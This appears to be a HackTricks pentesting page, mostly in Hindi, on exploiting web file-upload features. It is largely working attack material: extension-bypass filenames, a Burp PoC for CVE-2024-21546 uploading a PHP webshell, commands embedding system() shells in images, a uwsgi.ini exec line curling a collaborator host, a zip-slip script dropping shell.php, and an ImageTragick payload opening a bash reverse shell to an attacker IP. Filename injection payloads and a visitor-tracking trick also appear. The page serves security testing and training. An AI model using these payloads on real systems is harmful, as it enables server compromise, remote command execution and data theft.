# फ़ाइल अपलोड

{{#include ../../banners/hacktricks-training.md}}

## फ़ाइल अपलोड सामान्य कार्यप्रणाली

अन्य उपयोगी extensions:

- **PHP**: _.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, .phps, ._pht_, ._phtm, .phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module_
- **Working in PHPv8**: _.php_, _.php4_, _.php5_, .phtml_, .module_, .inc_, .hphp_, .ctp_
- **ASP**: _.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml_
- **Jsp:** _.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action_
- **Coldfusion:** _.cfm, .cfml, .cfc, .dbm_
- **Flash**: _.swf_
- **Perl**: _.pl, .cgi_
- **Erlang Yaws Web Server**: _.yaws_

### फ़ाइल एक्सटेंशन चेक बायपास करना

1. यदि वे लागू हों, तो **पहले बताए गए extensions** की **जाँच** करें। उन्हें कुछ **uppercase letters** के साथ भी टेस्ट करें: _pHp, .pHP5, .PhAr ..._
2. _एक्जीक्यूशन एक्सटेंशन से पहले एक वैध एक्सटेंशन जोड़ने की जाँच करें (पहले बताए गए extensions का भी उपयोग करें):_
- _file.png.php_
- _file.png.Php5_
3. अंत में **विशेष कैरेक्टर** जोड़ने की कोशिश करें। आप Burp का उपयोग करके सभी **ascii** और **Unicode** कैरेक्टर **bruteforce** कर सकते हैं। (_ध्यान दें कि आप पहले बताए गए **extensions** का भी उपयोग कर सकते हैं_)
- _file.php%20_
- _file.php%0a_
- _file.php%00_
- _file.php%0d%0a_
- _file.php/_
- _file.php.\\_
- _file._
- _file.php...._
- _file.pHp5...._
4. सर्वर-साइड के एक्सटेंशन पार्सर को फँसाकर सुरक्षा को बाइपास करने की कोशिश करें, जैसे **doubling** the **extension** या एक्सटेंशन्स के बीच **junk** डेटा (जैसे **null** बाइट्स) जोड़ना। _आप बेहतर payload तैयार करने के लिए **previous extensions** का भी उपयोग कर सकते हैं._
- _file.png.php_
- _file.png.pHp5_
- _file.php#.png_
- _file.php%00.png_
- _file.php\x00.png_
- _file.php%0a.png_
- _file.php%0d%0a.png_
- _file.phpJunk123png_
5. पिछली जाँच में **एक और लेयर** extensions जोड़ें:
- _file.png.jpg.php_
- _file.php%00.png%00.jpg_
6. वैध एक्सटेंशन से पहले **exec extension** रखने की कोशिश करें और आशा करें कि server misconfigured हो। (Apache misconfigurations को exploit करने में उपयोगी जहाँ किसी भी फाइल जिसका extension `.php` है, पर जरूरी नहीं कि वह `.php` पर खत्म हो, code execute हो जाएगा):
- _ex: file.php.png_
7. **NTFS alternate data stream (ADS)** का उपयोग **Windows** में। इस स्थिति में, एक colon character ":" निषिद्ध extension के बाद और अनुमति प्राप्त एक extension के पहले डाला जाएगा। परिणामस्वरूप, सर्वर पर एक **खाली फ़ाइल जिसपर निषिद्ध extension होगा** बन जाएगी (उदा. "file.asax:.jpg”). इस फ़ाइल को बाद में अन्य तकनीकों के जरिए संपादित किया जा सकता है जैसे कि इसका short filename उपयोग करना। पैटर्न "**::$data**” का उपयोग non-empty फ़ाइलें बनाने के लिए भी किया जा सकता है। इसलिए, इस पैटर्न के बाद एक dot character जोड़ना भी आगे की प्रतिबंधों को बायपास करने में उपयोगी हो सकता है (उदा. "file.asp::$data.”)
8. फ़ाइलनाम की सीमाएँ तोड़ने की कोशिश करें। वैध extension कट जाता है और malicious PHP बच जाता है। AAA<--SNIP-->AAA.php

```
# Linux maximum 255 bytes
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 255
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4 # minus 4 here and adding .png
# Upload the file and check response how many characters it alllows. Let's say 236
python -c 'print "A" * 232'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# Make the payload
AAA<--SNIP 232 A-->AAA.php.png
```

#### UniSharp Laravel Filemanager pre-2.9.1 (.php. trailing dot) – CVE-2024-21546

कुछ upload handlers सेव किए गए filename से trailing dot characters को trim या normalize कर देते हैं। UniSharp’s Laravel Filemanager (unisharp/laravel-filemanager) के 2.9.1 से पहले के संस्करणों में, आप extension validation को निम्न तरीकों से बायपास कर सकते हैं:

- एक वैध image MIME और magic header का उपयोग करें (उदा., PNG का `\x89PNG\r\n\x1a\n`).
- अपलोड की गई फ़ाइल का नाम PHP extension के बाद एक dot लगाकर दें, उदाहरण के लिए `shell.php.`.
- सर्वर trailing dot को हटा देता है और `shell.php` को persist करता है, जो execute होगा यदि यह किसी web-served directory में रखा गया हो (डिफ़ॉल्ट public storage जैसे `/storage/files/`).

न्यूनतम PoC (Burp Repeater):
```http
POST /profile/avatar HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="upload"; filename="0xdf.php."
Content-Type: image/png

\x89PNG\r\n\x1a\n<?php system($_GET['cmd']??'id'); ?>
------WebKitFormBoundary--
```
फिर saved path पर हिट करें (Laravel + LFM में सामान्य):
```
GET /storage/files/0xdf.php?cmd=id
```
रोकथाम:
- unisharp/laravel-filemanager को ≥ 2.9.1 में अपडेट करें।
- सख्त server-side allowlists लागू करें और persisted filename को पुनः मान्य (re-validate) करें।
- uploads को non-executable स्थानों से सर्व करें।

### Content-Type, Magic Number, Compression & Resizing को बायपास करना

- **Content-Type** checks को बायपास करने के लिए **Content-Type** **header** के **value** को सेट करें: _image/png_ , _text/plain , application/octet-stream_
1. Content-Type **wordlist**: [https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt)
- **magic number** check को बायपास करने के लिए फाइल की शुरुआत में एक वास्तविक image के **bytes** जोड़ें (फाइल कमांड _file_ को confuse करने के लिए)। या shell को **metadata** के अंदर डालें:\
`exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg`\
`\` या आप payload को सीधे किसी image में भी डाल सकते हैं:\
`echo '<?php system($_REQUEST['cmd']); ?>' >> img.png`
- यदि आपकी image पर **compressions** जोड़ी जा रही है, उदाहरण के लिए PHP-GD जैसी मानक PHP लाइब्रेरी का उपयोग करते हुए, तो पिछले techniques उपयोगी नहीं होंगे। हालांकि, आप **PLTE chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) का उपयोग कर कुछ टेक्स्ट insert कर सकते हैं जो **compression से बच जाए**।
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_plte_png.php)
- वेब पेज image को **resizing** भी कर सकता है, उदाहरण के लिए PHP-GD की `imagecopyresized` या `imagecopyresampled` फंक्शन्स का उपयोग करके। हालांकि, आप **IDAT chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) का उपयोग कर टेक्स्ट insert कर सकते हैं जो **compression से बच जाए**।
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_idat_png.php)
- एक और तकनीक है जिससे payload **image resizing** के बाद भी बच सकता है, जो PHP-GD के `thumbnailImage` फंक्शन का उपयोग करता है। हालांकि, आप **tEXt chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) का उपयोग कर ऐसा टेक्स्ट insert कर सकते हैं जो **compression से बच जाए**।
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_tEXt_png.php)

### अन्य जांचने योग्य तरकीबें

- पहले से अपलोड की गई फाइल का **rename** करने वाली कोई vulnerability खोजें (extension बदलने के लिए)।
- backdoor execute करने के लिए कोई **Local File Inclusion** vulnerability खोजें।
- **संभावित सूचना-प्रकटीकरण**:
1. एक ही फाइल को **कई बार** (और एक ही समय में) **उसी नाम** के साथ upload करें।
2. ऐसी फाइल upload करें जिसका **name** किसी पहले से मौजूद **file** या **folder** जैसा हो।
3. ऐसी फाइल upload करना जिसका नाम **"."**, ".." या "..." जैसा हो। उदाहरण के लिए, Apache में **Windows** पर यदि एप्लिकेशन "/www/uploads/" डायरेक्टरी में अपलोड फ़ाइलें सेव करता है, तो "." नाम वाली फ़ाइल "/www/" डायरेक्टरी में "uploads" नाम की फ़ाइल बना देगी।
4. ऐसी फ़ाइल अपलोड करें जिसे आसानी से delete नहीं किया जा सके, जैसे **"…:.jpg"** NTFS में। (Windows)
5. **Windows** में नाम में अवैध characters जैसे `|<>*?”` के साथ फाइल अपलोड करें। (Windows)
6. **Windows** में reserved (forbidden) names जैसे CON, PRN, AUX, NUL, COM1 … COM9, LPT1 … LPT9 आदि के साथ फाइल अपलोड करने की कोशिश करें।
- यह भी आज़माएँ कि कोई **executable** (.exe) या कोई **.html** (कम संदिग्ध) अपलोड करें जो victim द्वारा गलती से खोले जाने पर कोड execute कर दे।

### Special extension tricks

यदि आप **PHP server** पर फाइलें अपलोड करने की कोशिश कर रहे हैं, तो [कोड execute करने के लिए **.htaccess** trick देखें](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/php-tricks-esp/index.html#code-execution).\
यदि आप **ASP server** पर फाइलें अपलोड करने की कोशिश कर रहे हैं, तो [कोड execute करने के लिए **.config** trick देखें](../../network-services-pentesting/pentesting-web/iis-internet-information-services.md#execute-config-files).

`.phar` फाइलें java के `.jar` की तरह होती हैं, पर php के लिए, और इन्हें php फ़ाइल की तरह उपयोग किया जा सकता है (php से execute करना, या किसी स्क्रिप्ट में include करना...)।

`.inc` extension कभी-कभार php फाइलों के लिए उपयोग किया जाता है जो केवल import करने के लिए होते हैं, इसलिए किसी समय किसी ने इस extension को execute होने की अनुमति दे दी हो सकती है।

## **Jetty RCE**

यदि आप Jetty server में XML फ़ाइल अपलोड कर सकते हैं तो आप [RCE प्राप्त कर सकते हैं क्योंकि **new \*.xml and \*.war are automatically processed**](https://twitter.com/ptswarm/status/1555184661751648256/photo/1)**।** जैसा कि नीचे image में दिखाया गया है, XML फ़ाइल को `$JETTY_BASE/webapps/` में अपलोड करें और shell की उम्मीद रखें!

![https://twitter.com/ptswarm/status/1555184661751648256/photo/1](<../../images/image (1047).png>)

## **uWSGI RCE**

इस vulnerability के विस्तृत विश्लेषण के लिए मूल रिसर्च देखें: [uWSGI RCE Exploitation](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html).

Remote Command Execution (RCE) vulnerabilities का उपयोग uWSGI servers में तब किया जा सकता है जब किसी के पास `.ini` configuration file को modify करने की क्षमता हो। uWSGI configuration files एक विशेष syntax का उपयोग करते हैं जो "magic" variables, placeholders, और operators को शामिल करने की अनुमति देता है। विशेष रूप से, '@' operator, जिसे `@(filename)` के रूप में उपयोग किया जाता है, किसी फ़ाइल की सामग्री को include करने के लिए design किया गया है। uWSGI में समर्थित विभिन्न schemes में "exec" scheme काफी शक्तिशाली है, जो किसी process के standard output से डेटा पढ़ने की अनुमति देता है। जब `.ini` configuration file प्रोसेस की जाती है तो इस फीचर का दुरुपयोग Remote Command Execution या Arbitrary File Write/Read जैसे दुष्प्रयोगों के लिए किया जा सकता है।

निम्नलिखित हानिकारक `uwsgi.ini` फ़ाइल के उदाहरण पर विचार करें, जो विभिन्न schemes दिखाती है:
```ini
[uwsgi]
; read from a symbol
foo = @(sym://uwsgi_funny_function)
; read from binary appended data
bar = @(data://[REDACTED])
; read from http
test = @(http://[REDACTED])
; read from a file descriptor
content = @(fd://[REDACTED])
; read from a process stdout
body = @(exec://whoami)
; curl to exfil via collaborator
extra = @(exec://curl http://collaborator-unique-host.oastify.com)
; call a function returning a char *
characters = @(call://uwsgi_func)
```
पेलोड का execution configuration file की parsing के दौरान होता है। Configuration को सक्रिय और पार्स होने के लिए, uWSGI प्रक्रिया को या तो restart किया जाना चाहिए (संभवतः crash के बाद या Denial of Service attack के कारण) या फ़ाइल को auto-reload पर सेट करना होगा। यदि auto-reload सक्षम है, तो यह परिवर्तन मिलने पर निर्दिष्ट अंतरालों पर फ़ाइल को reload कर देता है।

यह समझना महत्वपूर्ण है कि uWSGI की configuration file parsing कितनी lax है। विशेष रूप से, यहां चर्चा किया गया payload एक binary फ़ाइल (जैसे image या PDF) में डाला जा सकता है, जिससे संभावित exploitation का दायरा और बढ़ जाता है।

## **wget फ़ाइल अपलोड/SSRF ट्रिक**

कभी-कभी आपको पता चलेगा कि एक server **`wget`** का उपयोग करके **फ़ाइलें डाउनलोड** कर रहा है और आप **URL** निर्दिष्ट कर सकते हैं। ऐसे मामलों में, कोड यह जांच सकता है कि डाउनलोड की गई फ़ाइलों का extension एक whitelist के अंदर है ताकि केवल अनुमति प्राप्त फ़ाइलें ही डाउनलोड हों। हालाँकि, **यह जांच bypass की जा सकती है।**

The **maximum** length of a **filename** in **linux** is **255**, however, **wget** truncate the filenames to **236** characters. You can **"A"\*232+".php"+".gif" नाम की फ़ाइल डाउनलोड कर सकते हैं**, यह फ़ाइलनाम उस **check** को **bypass** कर देगा (जैसा कि इस उदाहरण में **".gif"** एक **valid** extension है) पर `wget` फ़ाइल का **rename** करके उसे **"A"\*232+".php"** बना देगा।
```bash
#Create file and HTTP server
echo "SOMETHING" > $(python -c 'print("A"*(236-4)+".php"+".gif")')
python3 -m http.server 9080
```

```bash
#Download the file
wget 127.0.0.1:9080/$(python -c 'print("A"*(236-4)+".php"+".gif")')
The name is too long, 240 chars total.
Trying to shorten...
New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.
--2020-06-13 03:14:06--  http://127.0.0.1:9080/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif
Connecting to 127.0.0.1:9080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10 [image/gif]
Saving to: ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’

AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[===============================================>]      10  --.-KB/s    in 0s

2020-06-13 03:14:06 (1.96 MB/s) - ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’ saved [10/10]
```
Note that **another option** you may be thinking of to bypass this check is to make the **HTTP server redirect to a different file**, so the initial URL will bypass the check by then wget will download the redirected file with the new name. This **won't work** **unless** wget is being used with the **parameter** `--trust-server-names` because **wget will download the redirected page with the name of the file indicated in the original URL**.

## Tools

- [Upload Bypass](https://github.com/sAjibuu/Upload_Bypass) एक शक्तिशाली टूल है जो Pentesters और Bug Hunters को file upload mechanisms का परीक्षण करने में मदद करने के लिए डिज़ाइन किया गया है। यह विभिन्न bug bounty तकनीकों का उपयोग करके कमजोरियों की पहचान और exploit करने की प्रक्रिया को सरल बनाता है, जिससे web applications का thorough assessment सुनिश्चित होता है।

### Corrupting upload indices with snprintf quirks (historical)

कुछ पुरानी upload handlers जो `snprintf()` या इसी तरह के तरीकों का उपयोग करके single-file upload से multi-file arrays बनाती हैं, उन्हें `_FILES` संरचना को गलती से forge करने के लिए trick किया जा सकता है। `snprintf()` के व्यवहार में असंगतताओं और truncation के कारण, सावधानीपूर्वक बनाए गए एक single upload को सर्वर साइड पर multiple indexed files के रूप में दिखाई दे सकता है, जिससे वह लॉजिक भ्रमित हो सकता है जो एक सख्त आकार मानता है (उदाहरण के लिए, इसे multi-file upload मानकर unsafe ब्रांच पकड़ लेना)। आजकल यह पैटर्न niche है, पर यह कभी-कभी CTFs और पुराने कोडबेस में फिर से उभरता है।

## From File upload to other vulnerabilities

- Set **filename** to `../../../tmp/lol.png` and try to achieve a **path traversal**
- Set **filename** to `sleep(10)-- -.jpg` and you may be able to achieve a **SQL injection**
- Set **filename** to `<svg onload=alert(document.domain)>` to achieve a XSS
- Set **filename** to `; sleep 10;` to test some command injection (more [command injections tricks here](../command-injection.md))
- [**XSS** in image (svg) file upload](../xss-cross-site-scripting/index.html#xss-uploading-files-svg)
- **JS** file **upload** + **XSS** = [**Service Workers** exploitation](../xss-cross-site-scripting/index.html#xss-abusing-service-workers)
- [**XXE in svg upload**](../xxe-xee-xml-external-entity.md#svg-file-upload)
- [**Open Redirect** via uploading svg file](../open-redirect.md#open-redirect-uploading-svg-files)
- Try **different svg payloads** from [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet)
- [Famous **ImageTrick** vulnerability](https://mukarramkhalid.com/imagemagick-imagetragick-exploit/)
- If you can **indicate the web server to catch an image from a URL** you could try to abuse a [SSRF](../ssrf-server-side-request-forgery/index.html). If this **image** is going to be **saved** in some **public** site, you could also indicate a URL from [https://iplogger.org/invisible/](https://iplogger.org/invisible/) and **steal information of every visitor**.
- [**XXE and CORS** bypass with PDF-Adobe upload](pdf-upload-xxe-and-cors-bypass.md)
- Specially crafted PDFs to XSS: The [following page present how to **inject PDF data to obtain JS execution**](../xss-cross-site-scripting/pdf-injection.md). If you can upload PDFs you could prepare some PDF that will execute arbitrary JS following the given indications.
- Upload the \[eicar]\([**https://secure.eicar.org/eicar.com.txt**](https://secure.eicar.org/eicar.com.txt)) content to check if the server has any **antivirus**
- Check if there is any **size limit** uploading files

Here’s a top 10 list of things that you can achieve by uploading (from [here](https://twitter.com/SalahHasoneh1/status/1281274120395685889)):

1. **ASP / ASPX / PHP5 / PHP / PHP3**: Webshell / RCE
2. **SVG**: Stored XSS / SSRF / XXE
3. **GIF**: Stored XSS / SSRF
4. **CSV**: CSV injection
5. **XML**: XXE
6. **AVI**: LFI / SSRF
7. **HTML / JS** : HTML injection / XSS / Open redirect
8. **PNG / JPEG**: Pixel flood attack (DoS)
9. **ZIP**: RCE via LFI / DoS
10. **PDF / PPTX**: SSRF / BLIND XXE

#### Burp Extension


{{#ref}}
https://github.com/portswigger/upload-scanner
{{#endref}}

## Magic Header Bytes

- **PNG**: `"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\x s0\x03["`
- **JPG**: `"\xff\xd8\xff"`

Refer to [https://en.wikipedia.org/wiki/List_of_file_signatures](https://en.wikipedia.org/wiki/List_of_file_signatures) for other filetypes.

## Zip/Tar File Automatically decompressed Upload

If you can upload a ZIP that is going to be decompressed inside the server, you can do 2 things:

### Symlink

Upload a link containing soft links to other files, then, accessing the decompressed files you will access the linked files:
```
ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt
tar -cvf test.tar symindex.txt
```
### अलग फ़ोल्डरों में डीकम्प्रेस करें

डीकम्प्रेशन के दौरान निर्देशिकाओं में फाइलों का अनपेक्षित निर्माण एक गंभीर समस्या है। शुरुआती धारना यह हो सकती है कि यह सेटअप malicious file uploads के जरिए OS-level command execution से सुरक्षा प्रदान करेगा, लेकिन ZIP archive format की hierarchical compression support और directory traversal क्षमताओं का दुरुपयोग किया जा सकता है। इससे attackers प्रतिबंधों को बायपास कर सकते हैं और टारगेट किए गए एप्लिकेशन की decompression functionality को manipulate करके secure upload directories से बाहर निकल सकते हैं।

ऐसी फाइलें तैयार करने के लिए एक automated exploit उपलब्ध है: [**evilarc on GitHub**](https://github.com/ptoomey3/evilarc). इस utility का उपयोग निम्नानुसार किया जा सकता है:
```python
# Listing available options
python2 evilarc.py -h
# Creating a malicious archive
python2 evilarc.py -o unix -d 5 -p /var/www/html/ rev.php
```
इसके अतिरिक्त, **symlink trick with evilarc** एक विकल्प है। यदि लक्ष्य `/flag.txt` जैसी फ़ाइल को निशाना बनाना है, तो उस फ़ाइल का एक symlink आपके सिस्टम में बनाया जाना चाहिए। यह सुनिश्चित करता है कि evilarc को उसके संचालन के दौरान त्रुटियाँ न हों।

नीचे दुर्भावनापूर्ण zip फ़ाइल बनाने के लिए उपयोग किए गए Python कोड का एक उदाहरण दिया गया है:
```python
#!/usr/bin/python
import zipfile
from io import BytesIO

def create_zip():
f = BytesIO()
z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
z.writestr('../../../../../var/www/html/webserver/shell.php', '<?php echo system($_REQUEST["cmd"]); ?>')
z.writestr('otherfile.xml', 'Content of the file')
z.close()
zip = open('poc.zip','wb')
zip.write(f.getvalue())
zip.close()

create_zip()
```
**Abusing compression for file spraying**

For further details **अधिक जानकारी के लिए मूल पोस्ट देखें**: [https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/](https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/)

1.  **Creating a PHP Shell**: PHP कोड ऐसे कमांड्स को निष्पादित करने के लिए लिखा गया है जो `$_REQUEST` वेरिएबल के माध्यम से पास होते हैं।

```php
<?php
if(isset($_REQUEST['cmd'])){
$cmd = ($_REQUEST['cmd']);
system($cmd);
}?>
```

2.  **File Spraying and Compressed File Creation**: कई फाइलें बनाई जाती हैं और एक zip archive तैयार किया जाता है जिसमें ये फाइलें होती हैं।

```bash
root@s2crew:/tmp# for i in `seq 1 10`;do FILE=$FILE"xxA"; cp simple-backdoor.php $FILE"cmd.php";done
root@s2crew:/tmp# zip cmd.zip xx*.php
```

3.  **Modification with a Hex Editor or vi**: zip के अंदर फाइलों के नाम vi या hex editor का उपयोग करके बदले जाते हैं, "xxA" को "../" में बदलकर directories का traversal किया जाता है।

```bash
:set modifiable
:%s/xxA/..\//g
:x!
```

## ImageTragic

इस कंटेंट को image extension के साथ upload करें ताकि vulnerability **(ImageMagick , 7.0.1-1)** का exploit किया जा सके (exploit: [https://www.exploit-db.com/exploits/39767](https://www.exploit-db.com/exploits/39767))
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context
```
## PHP Shell को PNG में एम्बेड करना

PNG फ़ाइल के IDAT chunk में एक PHP shell एम्बेड करने से कुछ image processing ऑपरेशनों को प्रभावी ढंग से बायपास किया जा सकता है। PHP-GD के `imagecopyresized` और `imagecopyresampled` फ़ंक्शन्स इस संदर्भ में विशेष रूप से प्रासंगिक हैं, क्योंकि इन्हें आमतौर पर क्रमशः छवियों के resizing और resampling के लिए उपयोग किया जाता है। इन ऑपरेशनों से अप्रभावित रहने की embedded PHP shell की क्षमता कुछ उपयोग मामलों के लिए महत्वपूर्ण लाभ प्रदान करती है।

इस तकनीक का विस्तृत विश्लेषण, इसकी कार्यप्रणाली और संभावित अनुप्रयोगों सहित, निम्नलिखित लेख में उपलब्ध है: ["Encoding Web Shells in PNG IDAT chunks"](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/). यह स्रोत प्रक्रिया और उसके निहितार्थों की व्यापक समझ देता है।

अधिक जानकारी: [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)

## Polyglot फ़ाइलें

Polyglot files साइबर सुरक्षा में एक अनूठा उपकरण हैं, जो कैमेलियन की तरह काम करते हैं और एक साथ कई फ़ाइल फ़ॉर्मैट्स में वैध रूप से मौजूद हो सकते हैं। एक रोचक उदाहरण [GIFAR](https://en.wikipedia.org/wiki/Gifar) है, एक हाइब्रिड जो एक ही समय में GIF और RAR archive दोनों के रूप में कार्य करता है। ऐसी फ़ाइलें केवल इस जोड़ी तक सीमित नहीं हैं; GIF और JS या PPT और JS जैसे संयोजन भी संभव हैं।

Polyglot फ़ाइलों की मुख्य उपयोगिता उनकी उस क्षमता में निहित है कि वे प्रकार के आधार पर फ़ाइलों को स्क्रीन करने वाले सुरक्षा उपायों को बायपास कर सकती हैं। विभिन्न एप्लिकेशन्स में सामान्य प्रैक्टिस केवल कुछ फ़ाइल टाइप्स को upload की अनुमति देना है — जैसे JPEG, GIF, या DOC — ताकि संभावित हानिकारक फ़ॉर्मैट्स (जैसे JS, PHP, या Phar फ़ाइलें) से जोखिम कम किया जा सके। हालांकि, एक polyglot कई फ़ाइल प्रकारों की संरचनात्मक आवश्यकताओं को पूरा करके चुपके से इन प्रतिबंधों को बायपास कर सकता है।

अनुकूलनशीलता के बावजूद, polyglots की सीमाएं भी होती हैं। उदाहरण के लिए, जबकि एक polyglot एक साथ एक PHAR file (PHp ARchive) और एक JPEG दोनों हो सकता है, उसके upload की सफलता प्लेटफ़ॉर्म की file extension नीतियों पर निर्भर कर सकती है। यदि सिस्टम अनुमत एक्सटेंशनों के प्रति सख्त है, तो केवल संरचनात्मक द्वैत होने से polyglot का upload सुनिश्चित नहीं होगा।

अधिक जानकारी: [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)

### PDF की तरह दिखते हुए वैध JSON अपलोड करना

कैसे फाइल टाइप डिटेक्शन से बचें और वैध JSON फ़ाइल को PDF बनाकर अपलोड करें (techniques from **[this blog post](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)**):

- **`mmmagic` library**: यदि `%PDF` magic bytes पहले 1024 bytes में मौजूद हैं तो इसे वैध माना जाता है (post से उदाहरण लें)
- **`pdflib` library**: JSON के किसी field के अंदर एक नकली PDF फॉर्मैट जोड़ें ताकि लाइब्रेरी इसे PDF समझ ले (post से उदाहरण लें)
- **`file` binary**: यह फ़ाइल से 1048576 bytes तक पढ़ सकता है। बस JSON को इससे बड़ा बनाएं ताकि यह सामग्री को json के रूप में पार्स न कर सके और फिर JSON के अंदर वास्तविक PDF का प्रारम्भिक भाग रखें — इससे यह उसे PDF समझ लेगा

## संदर्भ

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files)
- [https://github.com/modzero/mod0BurpUploadScanner](https://github.com/modzero/mod0BurpUploadScanner)
- [https://github.com/almandin/fuxploider](https://github.com/almandin/fuxploider)
- [https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)
- [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)
- [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)
- [https://blog.doyensec.com/2025/01/09/cspt-file-upload.html](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)
- [CVE-2024-21546 – NVD entry](https://nvd.nist.gov/vuln/detail/CVE-2024-21546)
- [PoC gist for LFM .php. bypass](https://gist.github.com/ImHades101/338a06816ef97262ba632af9c78b78ca)
- [0xdf – HTB Environment (UniSharp LFM upload → PHP RCE)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)

{{#include ../../banners/hacktricks-training.md}}
